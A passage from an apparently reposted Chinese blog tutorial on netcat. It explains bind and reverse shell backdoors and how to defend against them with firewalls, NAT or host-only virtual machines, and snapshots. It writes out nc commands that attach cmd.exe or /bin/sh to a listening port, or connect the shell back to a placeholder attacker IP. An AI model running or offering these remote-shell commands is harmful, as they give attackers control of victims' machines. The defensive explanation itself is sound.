<h3 id="◇使用场景-10"><a href="#◇使用场景-10" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　假设1：你使用的浏览器存在某个安全漏洞，并且该漏洞会让攻击者获得【执行代码】的机会。<br>　　假设2：你在某个公共场合使用某个 wifi 热点上网。遗憾的是，这个热点是攻击者设置的陷阱。<br>　　假设3：设置该陷阱的攻击者，正好也知道：如何利用上述漏洞。<br>　　当这三个假设都成立，攻击者就可以获得在你【本机】执行代码的机会。这时候，攻击者可以下载一个 nc 到你本机，然后用 nc 开启一个【被动】连接型后门。所谓的“【被动】连接型”就是指——nc 开启对外监听端口。<br>　　在该场景中，因为攻击者与你处于【同一个局域网】，攻击者自然能从自己的机器访问到你本机的 nc 后门。</p>
<h3 id="◇原理-2"><a href="#◇原理-2" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　为了让后门能工作，通常会使用 nc 的 <code>-e</code> 选项，该选项的“选项值”是一个可执行文件的路径。<br>　　设置了该选项之后，当处于监听状态的 nc 接受到某个连接，会启动“选项值”对应的可执行文件（并得到某个进程），nc 会把该进程的“标准输入输出”与网络通讯【对接】。<br>　　为了让这个后门用起来足够爽，攻击者通常会让 nc 去启动一个【shell 进程】。对 Windows 系统而言，就是 <code>cmd.exe</code>；对 POSIX 系统（Linux or UNIX）而言，就是 <code>/bin/sh</code><br>　　在这种情况下（nc 挂载 shell），攻击者远程连入 nc 的端口，就可以直接在这个 shell 上进行各种操作，其效果类似于 SSH 或（老式的）telnet。</p>
<h3 id="◇入侵方法"><a href="#◇入侵方法" class="headerlink" title="◇入侵方法"></a>◇入侵方法</h3><p><strong>步骤1</strong><br>　　如果受害者是 Windows 系统，只须如下命令就可以开启一个后门（其中的 <code>xxx</code> 是端口号）</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-l</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-tag">xxx</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure>
<p>　　如果受害者是 POSIX 系统（Linux or UNIX），则用如下命令：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nc -l -p xxx -e <span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure>

<p><strong>步骤2</strong><br>　　后门创建好之后，攻击者在自己机器上也运行 nc（客户端 nc），然后连接到作为后门的 nc（服务端 nc）。一旦连上之后，攻击者就可以在自己的 nc 上看到对方（受害者机器）的 shell 提示符。</p>
<h3 id="◇补充说明：-e-选项"><a href="#◇补充说明：-e-选项" class="headerlink" title="◇补充说明：-e 选项"></a>◇补充说明：<code>-e</code> 选项</h3><p>　　据说是考虑到 <code>-e</code> 选项太过危险，nc 的 OpenBSD 变种（在多年前）已经【移除】了该选项。但其实捏，还是可以用间接的方式达到同样的效果（具体如何做，俺就不透露啦）。<br>　　另，“原版 nc”依然有这个选项；nc 的很多其它变种，也依然有这个选项。</p>
<h3 id="◇【不够】靠谱的防范措施"><a href="#◇【不够】靠谱的防范措施" class="headerlink" title="◇【不够】靠谱的防范措施"></a>◇【不够】靠谱的防范措施</h3><p>　　在这个场景中，大伙儿可能会想到三个值得改进之处：<br>1、浏览器的漏洞<br>2、使用公共 wifi 热点的习惯<br>3、防火墙的设置</p>
<p>　　对第1点<br>　　其实是【无解】滴！因为任何人都无法确保浏览器是【零漏洞】；</p>
<p>　　对第2点<br>　　要看每个人的具体情况而定。对有些人而言，“用公共热点上网”属于【刚需】。那就没办法了。</p>
<p>　　对第3点<br>　　“防火墙”这招，似乎是比较通用的解决之道。对大部分人而言，桌面 PC 根本就【不必】开启对外监听端口。因此，你可以配置操作系统自带防火墙，禁止【所有的】对外监听端口。<br>　　但是！（俺要开始说【但是】了）<br>　　操作系统自带的防火墙，本身也运行在操作系统【之内】。如果你是以【管理员身份】遭遇入侵，入侵者在进行【代码执行】的时候，就已经具有了【管理员权限】。在这个权限下，入侵者完全有可能“搞定”防火墙。方法有很多种——<br>比如说：把用作后门的端口号，悄悄加入到防火墙的白名单中；<br>再比如说：直接把防火墙的过滤模块干掉；<br>更牛逼的入侵者，甚至可以在【网卡驱动】上做文章——因为网卡驱动位于防火墙的过滤模块【之下】（比防火墙更底层）</p>
<h3 id="◇【靠谱】的防范措施——NAT-模式的虚拟机（Guest-OS）"><a href="#◇【靠谱】的防范措施——NAT-模式的虚拟机（Guest-OS）" class="headerlink" title="◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS）"></a>◇【靠谱】的防范措施——NAT 模式的虚拟机（Guest OS）</h3><p>　　首先，这里所说的“NAT 模式”指的是【虚拟机的网卡模式】。如果你不熟悉虚拟机的网卡模式，建议先看俺写的《<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/10/system-vm-0.html">扫盲操作系统虚拟机</a>》系列教程。</p>
<p>　　要想用这招，步骤如下：<br>1、当然先要安装【虚拟化软件】（VBox、VMware …），<br>2、安装一个虚拟的操作系统（洋文叫“Guest OS”）<br>3、虚拟系统的网卡设置为【NAT】模式</p>
<p>　　完成上述步骤后，你就可以在这个虚拟系统中上网。<br>　　NAT 的好处在于【单向可见】。也就是说，Guest OS 可以访问到物理系统（Host OS）【外部】的网络环境；但外部网络环境只能看到 Host OS，看不到 Guest OS。<br>　　在这种配置下，就算某个入侵者完全控制了你的 Guest OS，他/她也【没】办法在 Guest OS 中搭建“被动连接型后门”。换句话说，即使入侵者运行了这种后门，（但由于 NAT 的缘故）后门【无法】接受外部网络的连接，这个后门就【失去意义】啦。</p>
<h3 id="◇补充说明：“NAT-模式”如何搭配“系统防火墙”？"><a href="#◇补充说明：“NAT-模式”如何搭配“系统防火墙”？" class="headerlink" title="◇补充说明：“NAT 模式”如何搭配“系统防火墙”？"></a>◇补充说明：“NAT 模式”如何搭配“系统防火墙”？</h3><p>　　上述“NAT 招数”与“系统防火墙”并【不】矛盾。<br>　　也就是说，即使你用了这招，你的物理系统（Host OS）还是要配置系统防火墙，并禁止【所有的】对外监听端口。</p>
<h2 id="★招数12：（入侵手法）用-nc-开启【主动】连接型后门"><a href="#★招数12：（入侵手法）用-nc-开启【主动】连接型后门" class="headerlink" title="★招数12：（入侵手法）用 nc 开启【主动】连接型后门"></a>★招数12：（入侵手法）用 nc 开启【主动】连接型后门</h2><h3 id="◇使用场景-11"><a href="#◇使用场景-11" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　为了打字省力，继续用【前一个章节】的场景。差别在于，你采纳了前一章节的措施——在某个 NAT 模式的虚拟机（Gest OS）中上网，以对付【被动】连接型的 nc 后门。<br>　　可惜的是——即便如此，入侵者在利用漏洞并获得“执行代码”的机会之后，还是有办法用 nc 在你的电脑上搞一个网络后门。<br>　　虽然你用了 NAT 模式的【虚拟机】（Guest OS），但入侵者可以用 nc 创建一个【主动】连接型的网络后门（这种玩法，有时也称作“反向连接”的后门）。</p>
<h3 id="◇原理-3"><a href="#◇原理-3" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　原理其实与“招数11”很类似，唯一的差别在于——把客户端与服务端【对调】。也就是说，攻击者手头的 nc 充当服务端，而受害者机器上的 nc 充当客户端。此时，受害者本机的 nc【无须】开启监听端口，【不受】防火墙的影响，也【不受】NAT 的影响。</p>
<h3 id="◇入侵方法-1"><a href="#◇入侵方法-1" class="headerlink" title="◇入侵方法"></a>◇入侵方法</h3><p><strong>步骤1</strong><br>　　既然 nc 的“服务端”与“客户端”对调。因此攻击者要先在自己机器上运行“服务端 nc”，命令如下（其中的 <code>xxx</code> 是端口号）。当然啦，攻击者自己电脑的防火墙需要允许 <code>xxx</code> 端口号对外监听。</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc -lk -p xxx</span><br></code></pre></td></tr></table></figure>

<p><strong>步骤2</strong><br>　　如果受害者是 Windows 系统，只须如下命令就可以开启一个后门。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span> <span class="hljs-selector-tag">xxx</span><br></code></pre></td></tr></table></figure>
<p>　　如果受害者是 POSIX 系统，则用如下命令：</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -e /bin/sh <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xxx<br></code></pre></td></tr></table></figure>
<p>　　（在上述两个命令中， <code>xxx</code> 是步骤1用到的端口号，<code>x.x.x.x</code> 是攻击者的 IP 地址）</p>
<h3 id="◇比“NAT-模式”更保险的是——【隔离模式】的虚拟机"><a href="#◇比“NAT-模式”更保险的是——【隔离模式】的虚拟机" class="headerlink" title="◇比“NAT 模式”更保险的是——【隔离模式】的虚拟机"></a>◇比“NAT 模式”更保险的是——【隔离模式】的虚拟机</h3><p>　　所谓的【隔离模式】，指的是“Host Only 模式”或类似的模式（比如：“Internal 模式”）。<br>　　虽然当年那个系列讲的是【隐匿性】，但其中的【虚拟机隔离】，同样可以用来对付“主动连接型后门”。</p>
<p>　　有必要提醒一下：<br>　　【隔离的虚拟机】可以增加入侵者的攻击难度。但【不能】做到 100% 防范。<br>　　只要你能在某个隔离虚拟机中上网，那么——那些足够高级的木马，就【有可能】在隔离虚拟机中找到对外连接的通道。从而实现一个“【主动】连接型的后门”。<br>　　这下该咋办捏？<br>　　（在安全方面）虚拟机有两个【显著好处】——“网络隔离性”只是其中之一，另一个是【快照】。<br>　　如果你对安全性的要求【非常高】，要学会：<br>1、用“快照功能”建立【安全基线】<br>（所谓的【安全基线】就是说——在确保系统【纯洁】的时候，先做一个快照）<br>2、养成【定期回退快照】的好习惯<br>（就算你中了木马，只要一回退到【安全基线】，系统重新变得【纯洁】啦）</p>
<h3 id="◇“【主动】连接型后门”的优势之处（危险性之处）"><a href="#◇“【主动】连接型后门”的优势之处（危险性之处）" class="headerlink" title="◇“【主动】连接型后门”的优势之处（危险性之处）"></a>◇“【主动】连接型后门”的优势之处（危险性之处）</h3><p>　　简单对比一下“后门的两种连接方式”。</p>
<p><strong>可用性</strong><br>　　如果用“被动型后门”入侵桌面 PC，考虑到绝大部分桌面 PC 都处于内网（其网卡【并未】分配公网 IP）。对这种场景，攻击者需要与受害者在同一个局域网，才能与后门建立通讯。<br>　　相比之下，“主动型后门”就【没有】这种弊端。</p>
<p><strong>隐蔽性</strong><br>　　“被动型后门”需要显式开启监听端口，很容易引起用户的怀疑，或引起杀毒软件的注意。<br>　　相比之下，“主动型后门”就【没有】这个问题。</p>
<h2 id="★附录：netcat-的【其它变种】"><a href="#★附录：netcat-的【其它变种】" class="headerlink" title="★附录：netcat 的【其它变种】"></a>★附录：netcat 的【其它变种】</h2><p>　　本文开头部分已经介绍了“原版 nc”以及“OpenBSD 变种”。在结尾部分，简单聊聊其它几个变种。</p>
<h3 id="◇GNU-netcat"><a href="#◇GNU-netcat" class="headerlink" title="◇GNU netcat"></a>◇GNU netcat</h3><p>　　官网在“<a target="_blank" rel="noopener" href="http://netcat.sourceforge.net/">这里</a>”。<br>　　从名称可以猜出：这是 GNU 社区对“原版 nc”的重写，以符合 GPL 许可协议。<br>　　按照它官网的说法，“GNU netcat”100% 兼容“原版 nc”的 1.10 版本。（注：1.10 版本是“原版 nc”用得最广的版本）</p>
<h3 id="◇ncat"><a href="#◇ncat" class="headerlink" title="◇ncat"></a>◇ncat</h3><p>　　这是 nmap 社区重写的 nc，其官网页面在“<a target="_blank" rel="noopener" href="https://nmap.org/ncat/">这里</a>”，帮助页面在“<a target="_blank" rel="noopener" href="https://nmap.org/ncat/guide/">这里</a>”。<br>　　它的口号是：Ncat - Netcat for the 21st Century<br>　　与“OpenBSD 变种”类似，它也增加了代理的支持。相比“OpenBSD 变种”，它的主要亮点是：完全支持 SSL/TLS。<br>　　由于它源自 nmap 社区，已经被包含在 nmap 软件包中（大多数 Linux ＆ BSD 发行版的官方仓库都有 nmap）</p>
<h3 id="◇socat"><a href="#◇socat" class="headerlink" title="◇socat"></a>◇socat</h3><p>　　在所有的变种里面，（据俺所知）这款可能是功能最强滴！但使用方法也有很大的不同（更复杂了）。感觉像是另一个全新的软件。<br>　　很多主流的 Linux 发行版已经包含它。<br>　　他也完全支持 SSL/TLS。</p>
<h3 id="◇Cryptcat"><a href="#◇Cryptcat" class="headerlink" title="◇Cryptcat"></a>◇Cryptcat</h3><p>　　一看名称就能猜到：这是“加密的网猫”。<br>　　由于大部分网猫都是直接在“裸 TCP”之上传输数据。如果传输的内容本身是明文，会遭遇【网络嗅探】的风险。<br>　　这款变种在传输过程中用 twofish 算法加密，以规避嗅探。</p>
<h3 id="◇sbd"><a href="#◇sbd" class="headerlink" title="◇sbd"></a>◇sbd</h3><p>　　光看这3字母的名称，你可能不知道这款变种的特色。<br>　　但如果俺告诉你：“sbd”是“Secure BackDoor”的缩写，你多半就猜到其特色了。<br>　　它的加密采用“AES-128-CBC + HMAC-SHA1”。</p>
<h3 id="◇netrw"><a href="#◇netrw" class="headerlink" title="◇netrw"></a>◇netrw</h3><p>　　这是专门针对“文件传输”功能进行强化和简化的变种。<br>　　【简化】方面<br>　　它分成两个命令：<code>netread</code> 和 <code>netwrite</code>，分别对应发送和接收。（相对“原版 nc”）省了几个命令选项。<br>　　【强化】方面<br>　　它会对传输过程进行散列校验，以防止传输的数据被篡改。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">胡小宁</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://1905060202.github.io/2021/07/16/netcat/">http://1905060202.github.io/2021/07/16/netcat/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://1905060202.github.io" target="_blank">胡小宁的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/programthink/">programthink</a><a class="post-meta__tags" href="/tags/%E5%B0%8F%E5%A6%99%E6%8B%9B/">小妙招</a><a class="post-meta__tags" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/07/17/%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%EF%BC%9F/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">如何选择开源项目？</div></div></a></div><div class="next-post pull-right"><a href="/2021/07/16/java%E6%96%B0%E6%89%8B%E7%9A%84%E9%80%9A%E7%97%85/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">java新手的通病</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/07/16/java新手的通病/" title="java新手的通病"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-16</div><div class="title">java新手的通病</div></div></a></div><div><a href="/2021/07/17/如何选择开源项目？/" title="如何选择开源项目？"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-17</div><div class="title">如何选择开源项目？</div></div></a></div><div><a href="/2021/07/16/学习技术三部曲/" title="学习技术三部曲"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-16</div><div class="title">学习技术三部曲</div></div></a></div><div><a href="/2021/07/17/架构设计：进程还是线程？/" title="架构设计：进程还是线程？"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-17</div><div class="title">架构设计：进程还是线程？</div></div></a></div><div><a href="/2021/07/16/如何阅读一本书？/" title="如何阅读一本书？"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-16</div><div class="title">如何阅读一本书？</div></div></a></div><div><a href="/2021/07/17/架构设计：生产者-消费者模式/" title="架构设计：生产者/消费者模式"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-17</div><div class="title">架构设计：生产者/消费者模式</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/you.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">胡小宁</div><div class="author-info__description">虽千万人吾往矣</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">41</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/1905060202"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/1905060202" target="_blank" title="关注我"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">四海之内皆兄弟</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%AB%E7%9B%B2-netcat%EF%BC%88%E7%BD%91%E7%8C%AB%EF%BC%89%E7%9A%84-N-%E7%A7%8D%E7%94%A8%E6%B3%95%E2%80%94%E2%80%94%E4%BB%8E%E2%80%9C%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%E2%80%9D%E5%88%B0%E2%80%9C%E7%B3%BB%E7%BB%9F%E5%85%A5%E4%BE%B5%E2%80%9D"><span class="toc-number">1.</span> <span class="toc-text">扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E5%BC%95%E5%AD%90"><span class="toc-number">1.1.</span> <span class="toc-text">★引子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85netcat-%E6%98%AF%E4%B8%AA%E5%95%A5%E7%8E%A9%E6%84%8F%E5%84%BF%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">★netcat 是个啥玩意儿？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85netcat-%E8%83%BD%E5%B9%B2%E5%95%A5%EF%BC%9F"><span class="toc-number">1.3.</span> <span class="toc-text">★netcat 能干啥？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E6%A6%82%E8%BF%B0"><span class="toc-number">1.3.1.</span> <span class="toc-text">◇概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87nc-%E7%9A%84%E5%8F%98%E7%A7%8D"><span class="toc-number">1.3.2.</span> <span class="toc-text">◇nc 的变种</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85nc-%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AE%80%E4%BB%8B"><span class="toc-number">1.4.</span> <span class="toc-text">★nc 命令行简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87nc-%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9A%84%E5%B8%B8%E8%A7%84%E5%BD%A2%E5%BC%8F"><span class="toc-number">1.4.1.</span> <span class="toc-text">◇nc 命令行的常规形式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E4%BD%95%E4%B8%BA%E2%80%9C%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%80%89%E9%A1%B9%E2%80%9D%EF%BC%9F"><span class="toc-number">1.4.2.</span> <span class="toc-text">◇何为“命令行选项”？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E3%80%90%E5%B8%B8%E7%94%A8%E7%9A%84%E3%80%91%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%80%89%E9%A1%B9"><span class="toc-number">1.4.3.</span> <span class="toc-text">◇【常用的】命令行选项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%80%89%E9%A1%B9%E7%9A%84%E3%80%90%E5%90%88%E5%86%99%E3%80%91%E5%BD%A2%E5%BC%8F"><span class="toc-number">1.4.4.</span> <span class="toc-text">◇命令行选项的【合写】形式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E5%A6%82%E4%BD%95%E5%BC%BA%E8%A1%8C%E7%BB%88%E6%AD%A2-nc%EF%BC%9F"><span class="toc-number">1.4.5.</span> <span class="toc-text">◇如何强行终止 nc？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E6%8B%9B%E6%95%B01%EF%BC%9A%EF%BC%88%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%EF%BC%89%E6%B5%8B%E8%AF%95%E6%9F%90%E4%B8%AA%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E7%9A%84%E3%80%90%E7%9B%91%E5%90%AC%E3%80%91%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%90%A6%E5%8F%AF%E8%BE%BE"><span class="toc-number">1.5.</span> <span class="toc-text">★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.5.1.</span> <span class="toc-text">◇使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E6%96%B9%E6%B3%95"><span class="toc-number">1.5.2.</span> <span class="toc-text">◇方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E8%B6%85%E6%97%B6%E8%AE%BE%E7%BD%AE"><span class="toc-number">1.5.3.</span> <span class="toc-text">◇补充说明：超时设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9AUDP"><span class="toc-number">1.5.4.</span> <span class="toc-text">◇补充说明：UDP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E6%8B%9B%E6%95%B02%EF%BC%9A%EF%BC%88%E7%BD%91%E7%BB%9C%E8%AF%8A%E6%96%AD%EF%BC%89%E5%88%A4%E6%96%AD%E9%98%B2%E7%81%AB%E5%A2%99%E6%98%AF%E5%90%A6%E2%80%9C%E5%85%81%E8%AE%B8-or-%E7%A6%81%E6%AD%A2%E2%80%9D%E6%9F%90%E4%B8%AA%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.6.</span> <span class="toc-text">★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF-1"><span class="toc-number">1.6.1.</span> <span class="toc-text">◇使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E6%96%B9%E6%B3%95-1"><span class="toc-number">1.6.2.</span> <span class="toc-text">◇方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E6%98%AF%E5%90%A6%E7%9C%81%E7%95%A5%E2%80%9C-p%E2%80%9D%EF%BC%9F"><span class="toc-number">1.6.3.</span> <span class="toc-text">◇补充说明：是否省略“-p”？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E5%A6%82%E4%BD%95%E8%AE%A9-nc-%E7%9A%84%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3%E3%80%90%E6%8C%81%E7%BB%AD%E5%BC%80%E5%90%AF%E3%80%91"><span class="toc-number">1.6.4.</span> <span class="toc-text">◇补充说明：如何让 nc 的监听端口【持续开启】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9AUDP-1"><span class="toc-number">1.6.5.</span> <span class="toc-text">◇补充说明：UDP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E6%8B%9B%E6%95%B03%EF%BC%9A%EF%BC%88%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%89%E7%94%A8-nc-%E7%8E%A9%E2%80%9C%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E2%80%9D"><span class="toc-number">1.7.</span> <span class="toc-text">★招数3：（渗透测试）用 nc 玩“端口扫描”</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF-2"><span class="toc-number">1.7.1.</span> <span class="toc-text">◇使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E6%96%B9%E6%B3%95-2"><span class="toc-number">1.7.2.</span> <span class="toc-text">◇方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E4%BC%98%E5%8C%96%E8%BE%93%E5%87%BA"><span class="toc-number">1.7.3.</span> <span class="toc-text">◇补充说明：优化输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E8%B6%85%E6%97%B6%E8%AE%BE%E7%BD%AE-1"><span class="toc-number">1.7.4.</span> <span class="toc-text">◇补充说明：超时设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E%EF%BC%9A%E3%80%90%E5%B9%B6%E5%8F%91%E3%80%91%E6%89%AB%E6%8F%8F"><span class="toc-number">1.7.5.</span> <span class="toc-text">◇补充说明：【并发】扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%98%85%E6%8B%9B%E6%95%B04%EF%BC%9A%EF%BC%88%E9%9A%90%E5%8C%BF%E6%80%A7%EF%BC%89%E5%A6%82%E4%BD%95%E8%AE%A9-nc-%E8%B5%B0%E6%9A%97%E7%BD%91%EF%BC%88%E4%BB%A5-Tor-%E4%B8%BA%E4%BE%8B%EF%BC%89"><span class="toc-number">1.8.</span> <span class="toc-text">★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF-3"><span class="toc-number">1.8.1.</span> <span class="toc-text">◇使用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%97%87%E6%96%B9%E6%B3%95-3"><span 